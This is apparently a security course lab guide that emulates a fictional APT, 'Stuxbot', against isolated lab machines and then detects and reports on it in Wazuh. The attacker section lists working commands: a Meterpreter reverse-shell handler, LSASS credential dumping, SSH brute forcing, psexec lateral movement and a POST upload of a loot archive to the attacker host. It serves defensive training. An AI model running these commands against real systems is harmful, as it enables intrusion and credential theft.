# 10 — APT Case Study: "Stuxbot"

**Course topic: 9.6 Advanced Persistent Threats (APT) Case Studies**
**Where:** Kali as the adversary; Windows (and optional Linux) victims; Wazuh as the SOC.

**Goal:** run a **single, coherent, multi-stage intrusion** end-to-end — the way a real APT operates — then detect, hunt, and report on it using everything from Docs 05–08. This is the capstone lecture for Module 9.

---

## About "Stuxbot" and why it's emulated

**"Stuxbot"** is our **named, fictional APT** for this course — a stand-in inspired by famous real-world campaigns (Stuxnet-style staged intrusions). We **emulate** its behavior rather than run any real malware.

- We reproduce the **kill chain** and the **ATT&CK techniques** a real APT uses, so the **traces in Event Viewer, Sysmon, and Wazuh are realistic**.
- We use only controlled tools: **our own msfvenom payload**, **Atomic Red Team**, **MITRE Caldera**, and **Kali** utilities.
- No self-propagating or destructive code touches the lab. See the reasoning in [Doc 09](09-attack-simulation-catalog.md#read-this-first--why-we-emulate-instead-of-detonating-real-malware).

> This mirrors how threat-hunting training scenarios (Caldera adversary profiles, purple-team ranges) are built professionally.

---

## The Stuxbot scenario (narrative + kill chain)

> **Story:** Stuxbot targets a workstation via a phishing lure, establishes C2, escalates, harvests credentials, moves laterally toward a Linux server, collects data, and exfiltrates it. The SOC (you) must detect and reconstruct the whole thing.

| Stage | Adversary action | ATT&CK | Primary telemetry | Detection |
|-------|------------------|--------|-------------------|-----------|
| 1. Recon | Scan the victim subnet | T1046 | Sysmon EID3, firewall | conn spike hunt |
| 2. Initial Access | User runs `invoice.exe` (phish) | T1204 | Sysmon EID1/3/11 | rule 100340 |
| 3. Execution/C2 | Meterpreter/Caldera beacon | T1059/T1071/T1571 | Sysmon EID3 :4444 | rule 100340 |
| 4. Persistence | Registry Run key + scheduled task | T1547.001/T1053.005 | Sysmon EID1/13, Sec 4698 | persistence rules |
| 5. Priv Esc | UAC bypass | T1548.002 | Sysmon EID1, Sec 4672 | privesc hunt/rule |
| 6. Credential Access | Dump LSASS | T1003.001 | Sysmon EID10 | rule 100301 |
| 7. Discovery | Domain/host/user enum | T1087/T1082/T1018 | Sysmon EID1 | discovery hunt |
| 8. Lateral Movement | psexec/SSH to server | T1021 | Sec 4624 t3 / auth.log | lateral/5710 rules |
| 9. Collection | Stage + archive data | T1005/T1560 | Sysmon EID11 | FIM/collection |
| 10. Exfiltration | Upload archive to C2 | T1041 | Sysmon EID3 | C2/exfil rule |

---

## Part A — Run the intrusion (attacker seat)

> [!IMPORTANT]
> Snapshot **all** victims as `pre-stuxbot`. Confirm NAT is off. You'll roll back to re-record cleanly.

### Stage 1 — Recon (Kali)
```bash
nmap -sС -sV -Pn 10.10.10.20
```

### Stage 2–3 — Initial access + C2 (Kali serves, victim executes)
Kali:
```bash
cd /tmp && python3 -m http.server 8080
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.100; set LPORT 4444; exploit -j"
```
Windows victim (as the "phished user"):
```powershell
Invoke-WebRequest http://10.10.10.100:8080/invoice.exe -OutFile $env:USERPROFILE\Downloads\invoice.exe
& $env:USERPROFILE\Downloads\invoice.exe
```
You now have a Meterpreter session on Kali.

### Stage 4 — Persistence (from Meterpreter or victim)
```powershell
Invoke-AtomicTest T1547.001 -TestNumbers 1
Invoke-AtomicTest T1053.005 -TestNumbers 1
```

### Stage 5 — Privilege escalation
```powershell
Invoke-AtomicTest T1548.002 -TestNumbers 1
```

### Stage 6 — Credential access (Meterpreter)
```
getsystem
load kiwi
lsa_dump_sam
creds_all
```
(or `Invoke-AtomicTest T1003.001` on the victim.)

### Stage 7 — Discovery
```powershell
Invoke-AtomicTest T1087.001 -TestNumbers 1
Invoke-AtomicTest T1082 -TestNumbers 1
Invoke-AtomicTest T1018 -TestNumbers 1
```

### Stage 8 — Lateral movement (toward the Linux server, if built)
```bash
# From Kali, brute the server then move
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.30 -t 4 -f
ssh root@10.10.10.30      # using found creds
```
(Windows-only variant: `impacket-psexec administrator:'Password1!'@10.10.10.20`.)

### Stage 9–10 — Collection + exfiltration
```powershell
Invoke-AtomicTest T1560.001 -TestNumbers 1
Invoke-WebRequest -Uri http://10.10.10.100:8080/upload -Method POST -InFile C:\loot.zip
```

### Optional — run it all with Caldera
Deploy the Sandcat agent (Doc 09, Tactic 7) and launch a chained operation. Caldera executes stages automatically and gives you a clean per-technique timeline to correlate against Wazuh — excellent for a repeatable recording.

---

## Part B — Detect & reconstruct (defender seat) — this is the lecture

Now switch to Wazuh and rebuild the story **from the telemetry**, as an analyst who wasn't told what happened.

### 1. Triage the alerts
Wazuh → **Security events**, sort by level. You should see the high-severity alerts your rules produced: C2:4444 (100340), LSASS (100301), Office/PowerShell execution, brute-force correlation (100350). Note timestamps and the agent.

### 2. Pivot on the first suspicious host + time
Filter Discover to `agent.name: "win-victim"` around the earliest alert. Identify **patient zero** and the initial process (`invoice.exe`).

### 3. Reconstruct the process tree
Follow Sysmon `parentImage`→`image` chains from `invoice.exe`: what did it spawn? (PowerShell, schtasks, lsass access, network to 4444.) Build the lineage on screen.

### 4. Map to ATT&CK
Open the **MITRE ATT&CK** module for `win-victim`. Walk the tactics left-to-right — the matrix now tells the Stuxbot story visually: Initial Access → Execution → Persistence → Priv Esc → Cred Access → Discovery → Lateral Movement → C2 → Exfil.

### 5. Hunt for what alerts missed
Run the Doc 07 hunts to catch quieter stages (discovery bursts, persistence that didn't alert). Every gap you find → note it as a **new rule** (close the loop with Doc 08).

### 6. Follow the lateral move (if Linux included)
Pivot to `agent.name: "linux-victim"`: SSH brute (5710/100350) then a successful login and post-exploitation commands (auditd `exec`). Show the intrusion crossing OS boundaries in one SIEM.

### 7. Threat-intel enrichment
Show the C2 destination (`10.10.10.100`) matching your CDB list / MISP (Doc 06) — the IoC that confirms attacker infrastructure.

---

## Part C — Incident report (deliverable)

Have students write a short report using the **NIST CSF** or a simple IR structure. Template:

```markdown
# Incident Report — Stuxbot Intrusion

## Executive summary
One paragraph: what happened, impact, current status.

## Timeline (from Wazuh)
| Time | Host | Technique (ATT&CK) | Evidence (rule id / event id) |
|------|------|--------------------|-------------------------------|

## Attack narrative
Initial access → C2 → persistence → priv esc → cred access → lateral → exfil.

## Detections that fired
List rules (100301, 100310, 100320, 100340, 100350, 5710) and MITRE IDs.

## Detection gaps / new rules created
Techniques only caught by hunting; the rules you added to close them.

## Containment & recovery
Isolate host, kill C2, reset creds, remove persistence, restore from snapshot.

## Recommendations
Hardening, logging, and rule improvements.
```

A reference report structure lives in the source lab [sarthakdewanda/wazuh-siem-lab](https://github.com/sarthakdewanda/wazuh-siem-lab) (NIST CSF 2.0 example).

---

## Verify

- [ ] All 10 stages executed and produced telemetry.
- [ ] Wazuh shows high-severity alerts for the key stages.
- [ ] You reconstructed the full process tree from `invoice.exe`.
- [ ] The MITRE module shows the technique spread across tactics.
- [ ] (If Linux) the lateral move appears in the same SIEM.
- [ ] A written incident report exists.
- [ ] Rolled back all victims to `pre-stuxbot`.

---

> [!NOTE]
> **Recording checkpoint (9.6):** Record **Lesson 9.6 — APT Case Studies** here, ideally in two parts:
> 1. **Attack walkthrough** (attacker seat): narrate the Stuxbot kill chain as you execute Part A (or launch the Caldera operation).
> 2. **Investigation** (defender seat): Part B — triage, reconstruct, map to ATT&CK, hunt the gaps, enrich with TI, and present the incident report.
> This capstone ties together 9.1–9.5 into one story and is the strongest lecture in the module.

Next: [11 — Recording Plan](11-recording-plan.md)
